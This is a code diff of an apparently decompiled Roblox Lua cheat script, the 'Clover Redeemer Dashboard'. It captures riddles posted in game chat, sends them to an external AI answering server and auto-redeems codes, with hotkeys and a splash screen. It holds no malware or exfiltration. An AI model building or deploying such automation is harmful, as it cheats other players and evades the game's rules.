+		if u464 then
+			v486(false)
+			v292("riddle arm cancelled", t1.DIM)
+		else
+			v486(true)
+			v292("armed — next new message will be sent to AI instantly", t1.GOLD)
+		end
+	end
+
+	t19.MaybeAutoCapture = function(p97)
+		if not u464 then
+			return
+		end
+
+		for _, v in ipairs(p97) do
+			if v.Text ~= "" and not t40[v.Text] then
+				v486(false)
+				t19.Box.Text = v.Text
+				v292("riddle captured, asking AI…", t1.GOLD)
+				ask(v.Text)
+
+				return
+			end
+		end
+	end
+	t19.Ask = ask
+	t19.ToggleArmed = toggleArmed
+	t19.StepLeftBtn.MouseButton1Click:Connect(function()
+		autoRedeemThreshold = math.max(0, autoRedeemThreshold - 1)
+		v472()
+		v292("auto redeem threshold: " .. autoRedeemThreshold, t1.DIM)
+	end)
+	t19.StepRightBtn.MouseButton1Click:Connect(function()
+		autoRedeemThreshold = math.min(10, autoRedeemThreshold + 1)
+		v472()
+		v292("auto redeem threshold: " .. autoRedeemThreshold, t1.DIM)
+	end)
+	v472()
+	task.spawn(function()
+		while ScreenGui.Parent do
+			local get, v493 = v456("GET", "https://sab-riddle-server.onrender.com/health", nil)
+
+			if get and type(v493) == "table" and v493.ok then
+				t19.Status.Text = "AI server: online (" .. tostring(v493.model or "?") .. ")"
+				t19.Status.TextColor3 = t1.GREEN
+			else
+				t19.Status.Text = "AI server: offline — check Render deployment"
+				t19.Status.TextColor3 = t1.RED
+			end
+
+			task.wait(5)
+		end
+	end)
+	TextButton4.MouseButton1Click:Connect(function()
+		v298()
+	end)
+	TextButton5.MouseButton1Click:Connect(v442)
+	v435()
+	TextButton10.MouseButton1Click:Connect(function()
+		for match in s2:gmatch("%S+") do
+			t22[match] = true
+		end
+
+		v297()
+	end)
+	TextButton11.MouseButton1Click:Connect(function()
+		for match in s2:gmatch("%S+") do
+			t22[match] = false
+		end
+
+		v297()
+	end)
+
+	local function v496(p98)
+		u295 = p98
+		TextLabel8.Text = p98 and "ON" or "OFF"
+
+		local BG = p98 and t1.BG
+
+		TextLabel8.TextColor3 = BG or t1.DIM
+
+		if t3.AnimationsEnabled then
+			TweenService:Create(TextLabel8, TweenInfo.new(0.2), {
+				BackgroundColor3 = p98 and t1.GREEN or Color3.fromRGB(30, 45, 35)
+			}):Play()
+		else
+			TextLabel8.BackgroundColor3 = p98 and t1.GREEN or Color3.fromRGB(30, 45, 35)
+		end
+
+		v292("auto mode: " .. (p98 and "enabled" or "disabled"), p98 and t1.NEON or t1.DIM)
+	end
+
+	TextButton6.MouseButton1Click:Connect(function()
+		v496(not u295)
+	end)
+
+	local function v498()
+		if u2 then
+			if typeof(u2) == "Instance" then
+				pcall(function()
+					u2.Text = ""
+				end)
+			end
+		end
+
+		v296()
+		t18.ResetCount()
+		v292("cleared input box (sent history kept)", t1.RED)
+	end
+
+	TextButton9.MouseButton1Click:Connect(v498)
+	t19.AskBtn.MouseButton1Click:Connect(function()
+		t19.Ask(t19.Box.Text)
+	end)
+	t19.ArmBtn.MouseButton1Click:Connect(function()
+		t19.ToggleArmed()
+	end)
+
+	local connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+		if gameProcessed then
+			return
+		end
+
+		if input.KeyCode == Enum.KeyCode.R then
+			v442()
+		elseif input.KeyCode == Enum.KeyCode.Q then
+			v496(not u295)
+		elseif input.KeyCode == Enum.KeyCode.E then
+			v498()
+		elseif input.KeyCode == Enum.KeyCode.F then
+			v298()
+		end
+	end)
+
+	table.insert(genv.CloverRedeemerConnections, connection)
+	TextButton.MouseButton1Click:Connect(function()
+		local visible = not Frame2.Visible
+
+		Frame2.Visible = true
+		Frame.Visible = visible
+
+		if visible then
+			for _, v in ipairs(t20) do
+				v.Visible = true
+			end
+		end
+
+		if t3.AnimationsEnabled then
+			TweenService:Create(Frame2, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {
+				Size = visible and UDim2.fromScale(1, 1) or UDim2.fromScale(0, 0),
+				Position = visible and UDim2.fromScale(0, 0) or UDim2.fromScale(0.5, 0.5)
+			}):Play()
+			task.delay(visible and 0 or 0.25, function()
+				Frame2.Visible = visible
+				Frame.Visible = visible
+			end)
+		else
+			Frame2.Visible = visible
+			Frame.Visible = visible
+		end
+	end)
+
+	local function v503()
+		v8()
+		v435()
+
+		local function v504(p99, p100, p101)
+			p99.BackgroundColor3 = p101 and t1.GREEN or t1.RED
+			p100.TextColor3 = p101 and t1.WHITE or t1.RED
+		end
+
+		v504(Label, v179, u1 and typeof(u1) == "Instance")
+		v504(Box, v181, u2 and typeof(u2) == "Instance")
+		v504(Redeem, v183, u3 and typeof(u3) == "Instance")
+		TextLabel.Text = (u1 and 1 or 0) + (u2 and 1 or 0) + (u3 and 1 or 0) .. "/3 LINKED"
+	end
+	local function v505()
+		local Frame12 = v26("Frame", {
+			Size = UDim2.fromScale(1, 1),
+			BackgroundTransparency = 1,
+			Parent = ScreenGui
+		})
+		local TextLabel10 = v26("TextLabel", {
+			Size = UDim2.fromOffset(520, 105),
+			Position = UDim2.new(0.5, 8, 0.5, 10),
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			BackgroundTransparency = 1,
+			Text = "Clovexx",
+			TextColor3 = Color3.fromRGB(0, 0, 0),
+			Font = Enum.Font.GothamBold,
+			TextSize = 126,
+			TextTransparency = 1,
+			Rotation = -4,
+			ZIndex = 1,
+			Parent = Frame12
+		})
+		local TextLabel11 = v26("TextLabel", {
+			Size = UDim2.fromOffset(520, 105),
+			Position = UDim2.fromScale(0.5, 0.5),
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			BackgroundTransparency = 1,
+			Text = "Clovexx",
+			TextColor3 = t1.NEON,
+			Font = Enum.Font.GothamBold,
+			TextSize = 126,
+			TextTransparency = 1,
+			Rotation = -4,
+			Parent = Frame12
+		})
+
+		TextLabel11.ZIndex = 2
+		v26("UIStroke", {
+			Color = Color3.fromRGB(0, 0, 0),
+			Thickness = 2,
+			Transparency = 1,
+			Parent = TextLabel11
+		})
+
+		local Frame13 = v26("Frame", {
+			Size = UDim2.fromOffset(0, 5),
+			Position = UDim2.new(0.5, 0, 0.5, 78),
+			AnchorPoint = Vector2.new(0.5, 0.5),
+			BackgroundColor3 = t1.GREEN,
+			BackgroundTransparency = 1,
+			BorderSizePixel = 0,
+			Parent = Frame12
+		})
+
+		Frame13.ZIndex = 3
+		v27(Frame13, 3)
+
+		local Sound = v26("Sound", {
+			Name = "CloverStartupSound",
+			SoundId = "rbxassetid://138213892284919",
+			Volume = 0.65,
+			Parent = Frame12
+		})
+
+		pcall(function()
+			Sound.TimePosition = 19
+			Sound:Play()
+			task.delay(3, function()
+				pcall(function()
+					Sound:Stop()
+				end)
+			end)
+		end)
+
+		if t3.AnimationsEnabled then
+			TweenService:Create(TextLabel10, TweenInfo.new(0.65, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+				TextTransparency = 0.35
+			}):Play()
+			TweenService:Create(TextLabel10, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+				Size = UDim2.fromOffset(700, 180),
+				Position = UDim2.new(0.5, 12, 0.5, 14),
+				Rotation = 0
+			}):Play()
+			TweenService:Create(TextLabel11, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+				TextTransparency = 0
+			}):Play()
+			TweenService:Create(TextLabel11.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+				Transparency = 0
+			}):Play()
+			TweenService:Create(TextLabel11, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+				Size = UDim2.fromOffset(700, 180),
+				Rotation = 0
+			}):Play()
+			TweenService:Create(Frame13, TweenInfo.new(0.75, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+				Size = UDim2.fromOffset(430, 5),
+				BackgroundTransparency = 0
+			}):Play()
+		else
+			TextLabel10.TextTransparency = 0.35
+			TextLabel10.Size = UDim2.fromOffset(700, 180)
+			TextLabel10.Position = UDim2.new(0.5, 12, 0.5, 14)
+			TextLabel10.Rotation = 0
+			TextLabel11.TextTransparency = 0
+			TextLabel11.UIStroke.Transparency = 0
+			TextLabel11.Size = UDim2.fromOffset(700, 180)
+			TextLabel11.Rotation = 0
+			Frame13.Size = UDim2.fromOffset(430, 5)
+			Frame13.BackgroundTransparency = 0
+		end
+
+		local v511 = true
+
+		task.spawn(function()
+			local v512 = Random.new()
+			local v513 = v15 and 0.18
+
+			v513 = v513 or 0.06
+
+			while v511 and Frame12.Parent do
+				local v514 = v15 and v512:NextInteger(24, 42) or v512:NextInteger(34, 64)
+				local v515 = v512:NextNumber(0.03, 0.97)
+				local v516 = v512:NextNumber(-0.08, 0.08)
+				local v517 = v512:NextNumber(1.2, 2.15)
+				local TextLabel12 = v26("TextLabel", {
+					Size = UDim2.fromOffset(v514, v514),
+					Position = UDim2.new(v515, 0, -0.12, 0),
+					AnchorPoint = Vector2.new(0.5, 0.5),
+					BackgroundTransparency = 1,
+					Text = "☘",
+					TextColor3 = t1.NEON,
+					TextSize = v514,
+					Font = Enum.Font.GothamBold,
+					TextTransparency = 0.05,
+					Rotation = v512:NextNumber(-25, 25),
+					ZIndex = 4,
+					Parent = Frame12
+				})
+
+				v26("UIStroke", {
+					Color = Color3.fromRGB(0, 0, 0),
+					Thickness = 1.5,
+					Transparency = 0.25,
+					Parent = TextLabel12
+				})
+				TweenService:Create(TextLabel12, TweenInfo.new(v517, Enum.EasingStyle.Linear), {
+					Position = UDim2.new(v515 + v516, 0, 1.12, 0),
+					Rotation = TextLabel12.Rotation + v512:NextNumber(120, 300),
+					TextTransparency = 0.15
+				}):Play()
+				game:GetService("Debris"):AddItem(TextLabel12, v517 + 0.15)
+				task.wait(v513)
+			end
+		end)
+		task.wait(3)
+		v511 = false
+
+		if t3.AnimationsEnabled then
+			local tween = TweenService:Create(TextLabel11, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+				TextTransparency = 1,
+				Size = UDim2.fromOffset(760, 195)
+			})
+
+			TweenService:Create(TextLabel10, TweenInfo.new(0.4), {
+				TextTransparency = 1,
+				Size = UDim2.fromOffset(760, 195)
+			}):Play()
+			TweenService:Create(TextLabel11.UIStroke, TweenInfo.new(0.4), {
+				Transparency = 1
+			}):Play()
+			TweenService:Create(Frame13, TweenInfo.new(0.4), {
+				BackgroundTransparency = 1,
+				Size = UDim2.fromOffset(520, 5)
+			}):Play()
+			tween:Play()
+			tween.Completed:Connect(function()
+				Frame12:Destroy()
+				Frame2.Visible = true
+				Frame.Visible = true
+				TextButton.Visible = true
+				v297()
+				v503()
+				v292("☘ Clover Redeemer Dashboard loaded", t1.NEON)
+			end)
+		else
+			Frame12:Destroy()
+			Frame2.Visible = true
+			Frame.Visible = true
+			TextButton.Visible = true
+			v297()
+			v503()
+			v292("☘ Clover Redeemer Dashboard loaded", t1.NEON)
+		end
+	end
+
+	task.spawn(function()
+		while ScreenGui.Parent do
+			v503()
+			task.wait(1.5)
+		end
+	end)
+	task.spawn(function()
+		while ScreenGui.Parent do
+			v8()
+			v299()
+			task.wait(v15 and 0.2 or 0.03)
+		end
+	end)
+	v38()
+	v505()
+end
